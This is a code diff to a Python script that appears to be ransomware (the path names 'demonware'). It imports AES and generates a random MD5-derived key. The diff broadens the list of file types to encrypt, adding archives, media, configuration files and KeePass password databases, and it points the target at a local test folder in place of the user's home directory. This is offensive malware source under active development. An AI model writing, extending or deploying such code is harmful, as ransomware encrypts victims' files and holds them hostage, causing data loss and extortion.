@@ -1,3 +1,4 @@
+#/usr/bin/env python
 import os, sys, socket, string, random, hashlib, getpass, platform
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -37,13 +38,17 @@ key = hashlib.md5(gen_string()).hexdigest()
 platform = platform.system()
 
 # Encrypt file that endswith
-ext = ['.txt','.ppt','.pptx','.doc','.docx','.gif','.jpg','.png','.mp3','.ogg','.csv','.xls','.exe','.pdf', '.ods']
+ext = ['.txt',
+    '.ppt','.pptx','.doc','.docx','.gif','.jpg','.png', '.ico', '.mp3','.ogg',
+    '.csv','.xls','.exe','.pdf', '.ods','.odt','.kdbx','.kdb','.mp4','.flv','.ini',
+    '.iso','.zip','.tar','.tar.gz','.rar']
 
 def get_target():
     # Encrypt on this location
     # Users home on Linux
     if platform == 'Linux':
-        target = '/home/' + getpass.getuser() + '/'
+        #target = '/home/' + getpass.getuser() + '/'
+        target = '/home/lv-laptop/Documents/directories/programmeren/python/demonware/test' + '/'
         return target
 
     # Users home on Windows
